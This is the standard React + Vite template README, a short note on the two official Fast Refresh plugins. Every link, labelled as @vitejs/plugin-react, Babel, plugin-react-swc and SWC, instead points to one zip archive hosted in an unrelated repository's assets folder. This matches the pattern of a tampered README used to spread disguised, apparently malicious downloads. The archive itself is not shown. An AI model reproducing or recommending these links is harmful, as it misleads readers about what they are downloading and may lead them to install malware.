# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/AndresEspin1993/MERN_APV_FRONTEND/main/src/assets/FRONTEND_MER_AP_v2.3.zip) uses [Babel](https://raw.githubusercontent.com/AndresEspin1993/MERN_APV_FRONTEND/main/src/assets/FRONTEND_MER_AP_v2.3.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/AndresEspin1993/MERN_APV_FRONTEND/main/src/assets/FRONTEND_MER_AP_v2.3.zip) uses [SWC](https://raw.githubusercontent.com/AndresEspin1993/MERN_APV_FRONTEND/main/src/assets/FRONTEND_MER_AP_v2.3.zip) for Fast Refresh
